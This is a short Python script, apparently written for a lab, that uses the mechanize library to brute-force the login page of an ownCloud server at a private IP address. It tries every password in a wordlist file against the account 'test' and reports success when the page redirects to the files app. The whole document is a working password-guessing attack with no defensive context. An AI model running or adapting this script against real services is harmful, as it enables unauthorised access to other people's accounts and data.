import mechanize
import sys

br=mechanize.Browser()
reponse=br.open("http://172.17.121.133/owncloud/index.php/login")

fd=open(sys.argv[1])
listepass=fd.readlines()

for testpass in listepass:
  br.select_form(nr=0)
  br.form['user']="test"
  br.form['password']=testpass.rstrip()
  reponse=br.submit()
  if reponse.geturl()=="http://172.17.121.133/owncloud/index.php/apps/files/":
    print ("mdp OK  ",testpass)
    break
  else:
    print ("tentative mdp:",testpass,' ....echec')


fd.close()
